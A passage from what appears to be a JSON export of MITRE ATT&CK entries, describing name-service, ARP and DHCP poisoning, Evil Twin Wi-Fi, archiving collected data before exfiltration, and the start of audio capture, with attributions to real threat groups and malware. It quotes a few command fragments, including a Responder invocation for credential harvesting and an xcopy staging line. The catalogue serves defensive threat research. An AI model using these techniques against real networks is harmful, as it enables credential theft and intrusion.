LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.", "id": "T1557.001", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks."}, {"id": "S0357", "name": "Impacket", "description": "Impacket modules like ntlmrelayx and smbrelayx can be used in conjunction with Network Sniffing and LLMNR/NBT-NS Poisoning and SMB Relay to gather NetNTLM credentials for Brute Force or relay attacks that can gain code execution."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group executed Responder using the command [Responder file path] -i [IP address] -rPv on a compromised host to harvest credentials and move laterally."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can sniff plaintext network credentials and use NBNS Spoofing to poison name services."}, {"id": "S0174", "name": "Responder", "description": "Responder is used to poison name services to gather hashes and credentials from systems within a local network."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning."}]}, {"name": "ARP Cache Poisoning", "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.", "detailed_description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.", "id": "T1557.002", "examples": [{"id": "G0003", "name": "Cleaver", "description": "Cleaver has used custom tools to facilitate ARP cache poisoning."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used ARP spoofing to redirect a compromised machine to an actor-controlled website."}]}, {"name": "DHCP Spoofing", "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.", "detailed_description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients. The typical server-client interaction is as follows:\nThe client broadcasts a DISCOVER message.\nThe server responds with an OFFER message, which includes an available network address.\nThe client broadcasts a REQUEST message, which includes the network address offered.\nThe server acknowledges with an ACK message and the client receives the network configuration parameters.\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers. Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a INFORMATION-REQUEST (code 11) message to the All_DHCP_Relay_Agents_and_Servers multicast address. Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool.", "id": "T1557.003", "examples": []}, {"name": "Evil Twin", "description": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or Input Capture.", "detailed_description": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or Input Capture.\nBy using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.  A Wi-Fi Pineapple \u2013 a network security auditing and penetration testing tool \u2013 may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic.\nSimilarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.\nUpon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim\u2019s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.", "id": "T1557.004", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used a Wi-Fi Pineapple to set up Evil Twin Wi-Fi Poisoning for the purposes of capturing victim credentials or planting espionage-oriented malware."}]}]}, {"name": "Archive Collected Data", "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.", "detailed_description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.", "id": "T1560", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can encrypt data with 3DES before sending it over to a C2 server."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has compressed collected data before exfiltration."}, {"id": "G0007", "name": "APT28", "description": "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks."}, {"id": "G0050", "name": "APT32", "description": "APT32's backdoor has used LZMA compression and RC4 encryption before exfiltration."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has used ZIP to compress data gathered on a compromised host."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has compressed and encrypted data prior to exfiltration."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server."}, {"id": "S0521", "name": "BloodHound", "description": "BloodHound can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can zip files before exfiltration."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can compress data stolen from the Registry and volume shadow copies prior to exfiltration."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to compress stolen data into a .cab file."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can encrypt and store on disk collected data before exfiltration."}, {"id": "S0187", "name": "Daserf", "description": "Daserf hides collected data in password-protected .rar archives."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has compressed data into .zip files prior to exfiltration."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack packs collected data into a password protected archive."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has compressed collected data prior to exfiltration."}, {"id": "S0363", "name": "Empire", "description": "Empire can ZIP directories on the target system."}, {"id": "S0091", "name": "Epic", "description": "Epic encrypts collected data using a public key framework before sending it over the C2 channel. Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server."}, {"id": "S0343", "name": "Exaramel for Windows", "description": "Exaramel for Windows automatically encrypts files before sending them to the C2 server."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT encrypts collected data with AES and Base64 and then sends it to the C2 server."}, {"id": "G0037", "name": "FIN6", "description": "Following data collection, FIN6 has compressed log files into a ZIP archive prior to staging and exfiltration."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon encrypts data using Base64 before being sent to the command and control server."}, {"id": "G0004", "name": "Ke3chang", "description": "The Ke3chang group has been known to compress data before exfiltration."}, {"id": "S0487", "name": "Kessel", "description": "Kessel can RC4-encrypt credentials before sending to the C2."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has encrypted data and files prior to exfiltration."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2. "}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has archived victim's data prior to exfiltration."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron contains a function to encrypt and store emails that it collects."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has encrypted data before sending it to the server."}, {"id": "S1101", "name": "LoFiSe", "description": "LoFiSe can collect files into password-protected ZIP-archives for exfiltration."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has manually archived stolen files from victim machines before exfiltration."}, {"id": "S0010", "name": "Lurid", "description": "Lurid can compress data before sending it."}, {"id": "S0409", "name": "Machete", "description": "Machete stores zipped files with profile data from installed web browsers."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has encrypted files and information before exfiltration."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has the ability to compress archived screenshots."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork encrypted the collected files' path with AES and then encoded them with base64."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has encrypted stolen credit card information with AES and further encoded it with Base64."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess can encrypt browser database files prior to exfiltration."}, {"id": "S0113", "name": "Prikormka", "description": "After collecting documents from removable media, Prikormka compresses the collected files, and encrypts it with Blowfish."}, {"id": "S0279", "name": "Proton", "description": "Proton zips up files before exfiltrating them."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer archives collected system information in a text f ile, System info.txt, prior to exfiltration."}, {"id": "S0375", "name": "Remexi", "description": "Remexi encrypts and adds all gathered browser data into files for upload to C2."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT contains code to compress files."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter used LZ compression to compress initial reconnaissance reports before sending to the C2."}, {"id": "S1140", "name": "Spica", "description": "Spica can archive collected documents for exfiltration."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE has used FileReadZipSend to compress a file and send to C2."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN encrypts the collected files using 3-DES."}, {"id": "S0515", "name": "WellMail", "description": "WellMail can archive files on the compromised host."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET will compress entire ~/Desktop folders excluding all .git folders, but only if the total data size is under 200MB."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy  has used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration. "}], "sub_techniques": [{"name": "Archive via Utility", "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.", "detailed_description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as tar on Linux and macOS or zip on Windows systems.\nOn Windows, diantz or  makecab may be used to package collected files into a cabinet (.cab) file. diantz may also be used to download and compress files from remote locations (i.e. Remote Data Staging). xcopy on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration.\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.", "id": "T1560.001", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius used 7zip to archive extracted data in preparation for exfiltration."}, {"id": "G1024", "name": "Akira", "description": "Akira uses utilities such as WinRAR to archive data prior to exfiltration."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can zip and encrypt data collected on a target system."}, {"id": "G0006", "name": "APT1", "description": "APT1 has used RAR to compress files before moving them outside of the victim network."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used a variety of utilities, including WinRAR, to archive collected data with password protection."}, {"id": "G0022", "name": "APT3", "description": "APT3 has used tools to compress data before exfilling it."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used WinRAR to compress data prior to exfil."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used WinRAR and 7-Zip to compress an archive stolen data."}, {"id": "G0096", "name": "APT41", "description": "APT41 created a RAR archive of targeted files for exfiltration. Additionally, APT41 used the makecab.exe utility to both download tools, such as NATBypass, to the victim network and to archive a file for exfiltration."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used rar to compress data downloaded from internal Oracle databases prior to exfiltration."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used the JAR/ZIP file format for exfiltrated files."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has used several publicly available tools, including WinRAR and 7zip, to compress collected files and memory dumps prior to exfiltration."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has compressed data into password-protected RAR archives prior to exfiltration."}, {"id": "C0026", "name": "C0026", "description": "During C0026, the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021."}, {"id": "S0274", "name": "Calisto", "description": "Calisto uses the zip -r command to compress the data collected on the local system."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 has used xcopy \\\\<target_host>\\c$\\users\\public\\path.7z c:\\users\\public\\bin\\<target_host>.7z /H /Y to archive collected files."}, {"id": "S0160", "name": "certutil", "description": "certutil may be used to Base64 encode collected data."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts."}, {"id": "G0052", "name": "CopyKittens", "description": "CopyKittens uses ZPP, a .NET console program, to compress files with ZIP."}, {"id": "S0212", "name": "CORALDECK", "description": "CORALDECK has created password-protected RAR, WinImage, and zip archives to be exfiltrated."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has used the WinRAR utility to compress and encrypt stolen files."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors saved collected data to a tar archive."}, {"id": "S0187", "name": "Daserf", "description": "Daserf hides collected data in password-protected .rar archives."}, {"id": "S0062", "name": "DustySky", "description": "DustySky can compress files via RAR while staging data to be exfiltrated."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used WinRAR to compress stolen files into an archive prior to exfiltration."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has compressed the dump output of compromised credentials with a 7zip binary."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used RAR to compress collected data before exfiltration."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used 7-Zip to archive data."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used 7zr.exe to add collected files to an archive."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used WinRAR to compress and encrypt stolen data prior to exfiltration."}, {"id": "G0084", "name": "Gallmaker", "description": "Gallmaker has used WinZip, likely to archive data prior to exfiltration."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used 7-Zip and WinRAR to compress stolen files for exfiltration."}, {"id": "S1022", "name": "IceApple", "description": "IceApple can encrypt and compress files using Gzip prior to exfiltration."}, {"id": "S0278", "name": "iKitten", "description": "iKitten will zip up the /Library/Keychains directory before exfiltrating it."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used 7-Zip and WinRAR to archive collected data prior to exfiltration."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole uses WinRAR to compress data that is intended to be exfiltrated."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used QuickZip to archive stolen files before exfiltration."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can create a ZIP archive with specified files and directories."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has compressed files before exfiltration using TAR and RAR."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia creates a RAR archive based on collected files on the victim's machine."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used RAR to create password-protected archives of collected documents prior to exfiltration."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has compressed data before exfiltrating it using a tool called Abbrevia."}, {"id": "S0439", "name": "Okrum", "description": "Okrum was seen using a RAR archiver tool to compress/decompress data."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE compresses collected files with GZipStream before sending them to its C2 server."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the Makecab utility to compress and a version of WinRAR to create password-protected archives of stolen data prior to exfiltration."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group archived victim's data into a RAR file."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors uses zip to pack collected files before exfiltration."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors archived collected files with WinRAR, prior to exfiltration."}, {"id": "G1040", "name": "Play", "description": "Play has used WinRAR to compress files prior to exfiltration."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has the ability to compress files with zip."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains a module for compressing data using ZIP."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has used 7Zip to compress .txt, .pdf, .xls or .doc files prior to exfiltration."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY has Gzipped information and saved it to a random temp file before exfil."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can compress data with Zip before sending it over C2."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can compress and archive collected files using WinRAR."}, {"id": "S1040", "name": "Rclone", "description": "Rclone can compress files using gzip prior to exfiltration."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has downloaded 7-Zip to decompress password protected archives."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug extracted documents and bundled them into a RAR archive."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has leveraged  xcopy, 7zip, and RAR to stage and compress collected documents prior to exfiltration."}, {"id": "S0647", "name": "Turian", "description": "Turian can use WinRAR to create a password-protected archive for files of interest."}, {"id": "G0010", "name": "Turla", "description": "Turla has encrypted files stolen from connected USB drives into a RAR file before exfiltration."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has the ability to use the macOS built-in zip utility to archive files."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has archived data into ZIP files on compromised machines."}]}, {"name": "Archive via Library", "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.", "detailed_description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.", "id": "T1560.002", "examples": [{"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has compressed data using the aPLib compression library."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT can compress data with ZLIB prior to sending it back to the C2 server."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT applies compression to C2 traffic using the ZLIB library."}, {"id": "S0354", "name": "Denis", "description": "Denis compressed collected data using zlib."}, {"id": "S0091", "name": "Epic", "description": "Epic compresses the collected data with bzip2 before sending it to the C2 server."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can invoke the Common.Compress method to compress data with the C# GZipStream compression class."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has compressed collected files with zLib."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use zlib to compress and decompress data."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can zlib-compress data prior to exfiltration."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D scrambles and encrypts data using AES256 before sending it to the C2 server."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke compressed data with zlib prior to sending it over C2."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to use the open source libraries XZip/Xunzip and zlib to compress files."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration."}, {"id": "S0086", "name": "ZLib", "description": "The ZLib backdoor compresses communications using the standard Zlib compression library."}]}, {"name": "Archive via Custom Method", "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.", "detailed_description": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.", "id": "T1560.003", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL compresses output data generated by command execution with a custom implementation of the Lempel\u2013Ziv\u2013Welch (LZW) algorithm."}, {"id": "S0092", "name": "Agent.btz", "description": "Agent.btz saves system information into an XML file that is then XOR-encoded."}, {"id": "S0438", "name": "Attor", "description": "Attor encrypts collected data with a custom implementation of Blowfish and RSA ciphers."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT has encoded data into a binary blob using XOR."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 hex-encoded PII data prior to exfiltration."}, {"id": "G0052", "name": "CopyKittens", "description": "CopyKittens encrypts data with a substitute cipher prior to exfiltration."}, {"id": "S0038", "name": "Duqu", "description": "Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation."}, {"id": "S0036", "name": "FLASHFLOOD", "description": "FLASHFLOOD employs the same encoding scheme as SPACESHIP for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can use a dynamic XOR key and a custom XOR methodology to encode data before exfiltration. Also, FoggyWeb can encode C2 command output within a legitimate WebP file."}, {"id": "S0503", "name": "FrameworkPOS", "description": "FrameworkPOS can XOR credit card information before exfiltration."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has compressed collected files with zLib and encrypted them using an XOR operation with the string key from the command line or qwerasdf if the command line argument doesn\u2019t contain the key. File names are obfuscated using XOR with the same key as the compressed file content."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has encrypted data with XOR before sending it over the C2 channel."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole uses a variation of the XOR cipher to encrypt files before exfiltration."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used RC4 encryption before exfil."}, {"id": "G0032", "name": "Lazarus Group", "description": "A Lazarus Group malware sample encrypts data using a simple byte based XOR operation prior to exfiltration."}, {"id": "S0409", "name": "Machete", "description": "Machete's collected data is encrypted with AES before exfiltration."}, {"id": "S0443", "name": "MESSAGETAP", "description": "MESSAGETAP has XOR-encrypted and stored contents of SMS messages that matched its target list. "}, {"id": "S1059", "name": "metaMain", "description": "metaMain has used XOR-based encryption for collected files before exfiltration."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has encrypted documents with RC4 prior to exfiltration."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has used a custom encryption algorithm to encrypt collected data."}, {"id": "S0439", "name": "Okrum", "description": "Okrum has used a custom implementation of AES encryption to encrypt collected data."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE compresses collected files with a simple character replacement scheme before sending them to its C2 server."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has used AES in CBC mode to encrypt collected data when saving that data to disk."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can store collected documents in a custom container after encrypting and compressing them using RC4 and WinRAR."}, {"id": "S0169", "name": "RawPOS", "description": "RawPOS encodes credit card data it collected from the victim with XOR."}, {"id": "S0172", "name": "Reaver", "description": "Reaver encrypts collected data with an incremental XOR key prior to exfiltration."}, {"id": "S0258", "name": "RGDoor", "description": "RGDoor encrypts files with XOR before sending them back to the C2 server."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can archive data using RC4 encryption and Base64 encoding prior to exfiltration."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has encrypted collected data with AES-256 using a hardcoded key."}, {"id": "S0035", "name": "SPACESHIP", "description": "Data SPACESHIP copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has encrypted collected data using a XOR-based algorithm."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet encrypts exfiltrated data via C2 with static 31-byte long XOR keys."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP has encrypted collected data using AES CBC mode and encoded it using Base64."}, {"id": "S0098", "name": "T9000", "description": "T9000 encrypts collected data using a single byte XOR key."}]}]}, {"name": "Audio Capture", "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.", "detailed_description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.", "id": "T1123", "examples": [{"id": "G0067", "name": "APT37", "description": "APT37 has used an audio capturing utility known as SOUNDWAVE that captures microphone input."}, {"id": "S0438", "name": "Attor", "description": "Attor's has a plugin 